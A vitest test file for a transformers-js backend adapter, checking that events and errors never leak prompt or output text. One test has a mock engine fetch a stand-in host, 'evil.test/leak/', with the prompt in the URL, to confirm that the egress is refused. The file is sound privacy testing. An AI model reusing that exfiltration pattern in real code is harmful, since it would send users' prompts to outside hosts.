import { afterEach, beforeEach, describe, expect, it } from 'vitest';
import { AdapterError, type AssetSource } from '../spec/backend-adapter';
import { BackendRefusedError, loadWithFallback } from '../src/backends/chain';
import { createTransformersAdapter, type TransformersAdapter } from '../src/backends/transformers';
import { EventBus } from '../src/events';
import {
  ORT_FACTORY_URL,
  PREFIX,
  installLocation,
  makeWorld,
  mockEngine,
  pinsFor,
  profileOf,
} from './backends-helpers';

const PROMPT_SENTINEL = 'SENTINEL-PROMPT-7f3a';
const OUTPUT_SENTINEL = 'SENTINEL-OUTPUT-9c1d';

let restore: () => void;
const adapters: TransformersAdapter[] = [];
beforeEach(() => {
  restore = installLocation();
});
afterEach(async () => {
  for (const a of adapters.splice(0)) await a.unload();
  restore();
});

async function setup(engineOpts: Parameters<typeof mockEngine>[0]) {
  const w = await makeWorld();
  const engine = mockEngine(engineOpts);
  const adapter = createTransformersAdapter({
    device: 'wasm',
    ortFactoryUrl: ORT_FACTORY_URL,
    verifiedPrefix: PREFIX,
    pins: pinsFor(),
    engine: async () => engine.module as never,
  });
  adapters.push(adapter);
  const events = new EventBus();
  const load = () =>
    adapter.load(w.descriptorEntry, {
      assets: w.mgr as AssetSource,
      profile: profileOf('wasm-simd'),
      events,
    });
  const everything = () => JSON.stringify([...events.snapshot(), ...w.events.snapshot()]);
  return { w, engine, adapter, events, load, everything };
}

describe('events and errors never carry prompt text, output text or engine messages (R5)', () => {
  it('a successful run: no event contains the prompt or the output', async () => {
    const s = await setup({ reply: OUTPUT_SENTINEL });
    await s.load();
    const res = await s.adapter.generate(PROMPT_SENTINEL, { maxTokens: 16, temperature: 0 });
    expect(res.text).toBe(OUTPUT_SENTINEL); // the caller gets the output ...
    const wire = s.everything();
    expect(wire).not.toContain(PROMPT_SENTINEL); // ... the events never do
    expect(wire).not.toContain(OUTPUT_SENTINEL);
    expect(s.events.snapshot().some((e) => e.name === 'model.generate')).toBe(true);
  });

  it('an engine error that echoes the prompt: neither the events nor any error message contain it, the cause keeps it', async () => {
    const boom = new Error(
      `engine says: cannot process ${PROMPT_SENTINEL} (stack: at ort.wasm:0x12)`,
    );
    const s = await setup({ generateError: boom, reply: OUTPUT_SENTINEL });
    await s.load();
    let error: unknown;
    try {
      await s.adapter.generate(PROMPT_SENTINEL);
    } catch (e) {
      error = e;
    }
    expect(error).toBeInstanceOf(AdapterError);
    const ae = error as AdapterError;
    expect(ae.message).not.toContain(PROMPT_SENTINEL);
    expect(String(ae)).not.toContain(PROMPT_SENTINEL);
    expect(ae.stack ?? '').not.toContain(PROMPT_SENTINEL);
    expect(ae.cause).toBe(boom);
    expect(s.everything()).not.toContain(PROMPT_SENTINEL);
  });

  it('an engine load error that echoes the prompt: model.load.failed carries only enums', async () => {
    const boom = new Error(`load failed near ${PROMPT_SENTINEL}`);
    const s = await setup({ pipelineError: boom });
    let error: unknown;
    try {
      await s.load();
    } catch (e) {
      error = e;
    }
    expect((error as AdapterError).message).not.toContain(PROMPT_SENTINEL);
    expect(s.everything()).not.toContain(PROMPT_SENTINEL);
    const failed = s.events.snapshot().find((e) => e.name === 'model.load.failed');
    expect(failed?.attrs).toEqual({
      adapter: 'transformers-js',
      model: 'm.descriptor',
      device: 'wasm',
      code: 'backend',
    });
  });

  it('a rogue engine request with a secret in the URL: the egress event has the origin only', async () => {
    const s = await setup({
      inPipeline: async (env) => {
        await env.fetch(`https://evil.test/leak/${PROMPT_SENTINEL}?q=${PROMPT_SENTINEL}`);
      },
    });
    await expect(s.load()).rejects.toMatchObject({ code: 'egress_refused' });
    expect(s.everything()).not.toContain(PROMPT_SENTINEL);
    const e = s.events.snapshot().find((x) => x.name === 'backend.egress.refused')!;
    expect(e.attrs).toEqual({ adapter: 'transformers-js', origin: 'https://evil.test' });
  });

  it('a whole refused chain: every emitted event and the userMessage are free of the prompt, the output and the engine message', async () => {
    const boom = new Error(`engine says no near ${PROMPT_SENTINEL} and ${OUTPUT_SENTINEL}`);
    const w = await makeWorld();
    for (const id of [...w.fileIds, 'm.descriptor']) (await w.mgr.ensure(id)).release();
    const engine = mockEngine({ pipelineError: boom, reply: OUTPUT_SENTINEL });
    const mk = (device: 'webgpu' | 'wasm') => {
      const a = createTransformersAdapter({
        device,
        ortFactoryUrl: ORT_FACTORY_URL,
        verifiedPrefix: PREFIX,
        pins: pinsFor(),
        engine: async () => engine.module as never,
      });
      adapters.push(a);
      return a;
    };
    const events = new EventBus();
    let error: unknown;
    try {
      await loadWithFallback({
        profile: profileOf('webgpu-f16'),
        assets: w.mgr,
        models: ['m.descriptor'],
        adapters: [mk('webgpu'), mk('wasm')],
        events,
      });
    } catch (e) {
      error = e;
    }
    expect(error).toBeInstanceOf(BackendRefusedError);
    const refused = error as BackendRefusedError;
    const wire = JSON.stringify([...events.snapshot(), ...w.events.snapshot()]);
    for (const text of [
      wire,
      refused.userMessage,
      refused.message,
      JSON.stringify(refused.attempts),
    ]) {
      expect(text).not.toContain(PROMPT_SENTINEL);
      expect(text).not.toContain(OUTPUT_SENTINEL);
      expect(text).not.toContain('engine says');
    }
    expect(events.snapshot().some((e) => e.name === 'backend.refused')).toBe(true);
  });
});
